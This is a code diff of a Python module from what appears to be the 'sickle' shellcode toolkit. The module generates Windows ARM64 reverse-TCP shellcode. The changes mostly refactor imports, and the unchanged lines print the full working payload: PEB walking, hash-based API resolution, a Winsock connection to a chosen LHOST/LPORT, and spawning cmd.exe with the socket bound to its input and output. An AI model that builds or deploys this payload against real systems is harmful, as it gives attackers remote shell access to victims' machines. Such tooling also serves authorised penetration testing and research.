@@ -1,35 +1,21 @@
-from sys import argv
-from struct import pack
-from ctypes import sizeof
-from ctypes import c_uint64 
+import sys
+import ctypes
+import struct
+
+import sickle.common.lib.generic.convert as convert
+import sickle.common.lib.generic.mparser as modparser
+import sickle.common.lib.programmer.builder as builder
 
 from sickle.common.lib.reversing.assembler import Assembler
 
-from sickle.common.lib.programmer.builder import gen_offsets
-from sickle.common.lib.programmer.builder import init_sc_args
-from sickle.common.lib.programmer.builder import calc_stack_space
-
-from sickle.common.lib.generic.mparser import argument_check
-from sickle.common.lib.generic.convert import port_str_to_htons
-from sickle.common.lib.generic.convert import from_str_to_xwords
-from sickle.common.lib.generic.convert import ip_str_to_inet_addr
-from sickle.common.lib.generic.convert import from_str_to_win_hash
-
-from sickle.common.headers.windows.ntdef import _LIST_ENTRY
-from sickle.common.headers.windows.ntdef import _UNICODE_STRING
-from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
-from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS64
-from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
-from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER64
-from sickle.common.headers.windows.winternl import _PEB
-from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
-from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY
-from sickle.common.headers.windows.ws2def import AF_INET
-from sickle.common.headers.windows.ws2def import sockaddr
-from sickle.common.headers.windows.ws2def import IPPROTO_TCP
-from sickle.common.headers.windows.winsock2 import SOCK_STREAM
-from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
-from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES
+from sickle.common.headers.windows import (
+    winnt,
+    ntdef,
+    ws2def,
+    winternl,
+    winsock2,    
+    processthreadsapi,
+)
 
 class Shellcode():
 
@@ -41,7 +27,7 @@ class Shellcode():
 
     module = f"{platform}/{arch}/shell_reverse_tcp"
 
-    example_run = f"{argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
+    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
 
     ring = 3
 
@@ -71,7 +57,6 @@ class Shellcode():
 
         self.arg_list = arg_object["positional arguments"]
         arg_object["architecture"] = Shellcode.arch
-        self.builder = Assembler(Shellcode.arch)
 
         self.dependencies = {
             "Kernel32.dll": [
@@ -86,20 +71,20 @@ class Shellcode():
             ],
         }
 
-        sc_args = init_sc_args(self.dependencies)
+        sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({
             "wsaData"                       : 0x00, 
             "name"                          : 0x00,
-            "lpStartInfo"                   : sizeof(_STARTUPINFOA),
+            "lpStartInfo"                   : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
             "lpCommandLine"                 : len("cmd\x00"),
             "lpProcessInformation"          : 0x00,
         })
 
-        self.stack_space = calc_stack_space(sc_args,
-                                            Shellcode.arch)
+        self.stack_space = builder.calc_stack_space(sc_args,
+                                                    Shellcode.arch)
 
-        self.storage_offsets = gen_offsets(sc_args,
-                                           Shellcode.arch)
+        self.storage_offsets = builder.gen_offsets(sc_args,
+                                                   Shellcode.arch)
 
         return
 
@@ -113,12 +98,12 @@ getKernel32:
 getPEB:
     ldr x7, [x18, #0x60]
 getHeadEntry:
-    ldr x6, [x7, #{_PEB.Ldr.offset}]
-    ldr x6, [x6, #{_PEB_LDR_DATA.InLoadOrderModuleList.offset}]
+    ldr x6, [x7, #{winternl._PEB.Ldr.offset}]
+    ldr x6, [x6, #{winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
 search:
     eor x3, x3, x3
-    ldr x0, [x6, #{_LDR_DATA_TABLE_ENTRY.DllBase.offset}]
-    ldr x5, [x6, #{_LDR_DATA_TABLE_ENTRY.BaseDllName.offset + _UNICODE_STRING.Buffer.offset}]
+    ldr x0, [x6, #{winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
+    ldr x5, [x6, #{winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]
     ldr x6, [x6]
     ldrh w13, [x5, #0x18]
     cmp w13, w3
@@ -138,16 +123,16 @@ found:
 
         stub = f"""
 lookupFunction:
-    ldr w1, [x6, #{_IMAGE_DOS_HEADER.e_lfanew.offset}]
-    add x1, x1, #{_IMAGE_NT_HEADERS64.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
+    ldr w1, [x6, #{winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
+    add x1, x1, #{winnt._IMAGE_NT_HEADERS64.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
     add x1, x1, x6
     ldr w0, [x1]
     mov x1, x6
     add x1, x1, x0
-    ldr w0, [x1, #{_IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
+    ldr w0, [x1, #{winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
     mov x7, x6
     add x7, x7, x0
-    ldr w3, [x1, #{_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
+    ldr w3, [x1, #{winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
 parseNames:
     cmp x3, #0
     b.eq error
@@ -169,11 +154,11 @@ calcDone:
     cmp w8, w4
     b.ne parseNames
 findAddress:
-    ldr w7, [x1, #{_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
+    ldr w7, [x1, #{winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
     add x7, x7, x6
     eor x0, x0, x0
     ldrh w0, [x7, x3, lsl #1]
-    ldr w7, [x1, #{_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
+    ldr w7, [x1, #{winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
     add x7, x7, x6
     ldr w0, [x7, x0, lsl #2]
     add x0, x0, x6
@@ -187,23 +172,23 @@ error:
         """Generates the stub to load a library not currently loaded into a process
         """
 
-        lists = from_str_to_xwords(lib)
+        lists = convert.from_str_to_xwords(lib)
         write_index = self.storage_offsets['functionName']
 
         src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
 
         for i in range(len(lists["QWORD_LIST"])):
-            src += "    ldr x3, =0x{}\n".format( pack('<Q', lists["QWORD_LIST"][i]).hex() )
+            src += "    ldr x3, =0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
             src += "    str x3, [x29, #-{}]\n".format(hex(write_index))
             write_index -= 8
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    ldr w3, =0x{}\n".format( pack('<L', lists["DWORD_LIST"][i]).hex() ) 
+            src += "    ldr w3, =0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
             src += "    str w3, [x29, #-{}], ecx\n".format(hex(write_index))
             write_index -= 4
 
         for i in range(len(lists["WORD_LIST"])):
-            src += "    ldr w3, =0x{}\n".format( pack('<H', lists["WORD_LIST"][i]).hex() )
+            src += "    ldr w3, =0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
             src += "    str w3, [x29, #-{}]\n".format(hex(write_index))
             write_index -= 2
 
@@ -239,7 +224,7 @@ error:
             for func in range(len(imports)):
                 stub += f"""
 get_{imports[func]}:
-    ldr w4, ={from_str_to_win_hash(imports[func])}
+    ldr w4, ={convert.from_str_to_win_hash(imports[func])}
     bl lookupFunction
     str x0, [x29, #-{self.storage_offsets[imports[func]]}]
                 """
@@ -250,7 +235,7 @@ get_{imports[func]}:
         """Returns bytecode generated by the keystone engine.
         """
 
-        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
+        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
         if (argv_dict == None):
             exit(-1)
 
@@ -290,9 +275,9 @@ call_WSAStartup:
 ;                  [in] GROUP               g,               // x4      => NULL
 ;                  [in] DWORD               dwFlags);        // x5      => NULL
 call_WSASocketA:
-    mov x0, {AF_INET}
-    mov x1, {SOCK_STREAM}
-    mov x2, {IPPROTO_TCP}
+    mov x0, {ws2def.AF_INET}
+    mov x1, {winsock2.SOCK_STREAM}
+    mov x2, {ws2def.IPPROTO_TCP}
     eor x3, x3, x3
     eor x4, x4, x4
     eor x5, x5, x5
@@ -310,8 +295,8 @@ call_WSASocketA:
 call_connect:
     mov x0, x26
     add x1, x29, #-{self.storage_offsets['name']}
-    mov x2, {sizeof(sockaddr)}
-    ldr x25, ={hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{pack('<H', lport).hex()}0002
+    mov x2, {ctypes.sizeof(ws2def.sockaddr)}
+    ldr x25, ={hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
     str x25, [x1]
     eor x25, x25, x25
     str x25, [x1, #0x08]
@@ -328,19 +313,19 @@ setup_STARTUPINFOA:
     mov x24, x6
     mov x0, x6
     mov x1, #0x00
-    mov x2, {sizeof(_STARTUPINFOA)}
+    mov x2, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
     mov w3, w1
 memset_loop:
     strb w3, [x0], #1
     subs x2, x2, #1
     b.ne memset_loop
-    mov w5, #{sizeof(_STARTUPINFOA)}
+    mov w5, #{ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
     str w5, [x6]
-    mov w5, #{STARTF_USESTDHANDLES}
-    str w5, [x6, #{_STARTUPINFOA.dwFlags.offset}]
-    str x26, [x6, #{_STARTUPINFOA.hStdInput.offset}]
-    str x26, [x6, #{_STARTUPINFOA.hStdOutput.offset}]
-    str x26, [x6, #{_STARTUPINFOA.hStdError.offset}]
+    mov w5, #{processthreadsapi.STARTF_USESTDHANDLES}
+    str w5, [x6, #{processthreadsapi._STARTUPINFOA.dwFlags.offset}]
+    str x26, [x6, #{processthreadsapi._STARTUPINFOA.hStdInput.offset}]
+    str x26, [x6, #{processthreadsapi._STARTUPINFOA.hStdOutput.offset}]
+    str x26, [x6, #{processthreadsapi._STARTUPINFOA.hStdError.offset}]
 
 ; x0 => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // x0 => NULL
 ;                      [in, out, optional] LPSTR                 lpCommandLine,         // x1 => "cmd"
@@ -395,5 +380,9 @@ fin:
     def get_shellcode(self):
         """Generates Windows (x64) generic reverse shell
         """
+    
+        generator = Assembler(Shellcode.arch)
 
-        return self.builder.get_bytes_from_asm(self.generate_source())
+        src = self.generate_source()
+
+        return generator.get_bytes_from_asm(src)
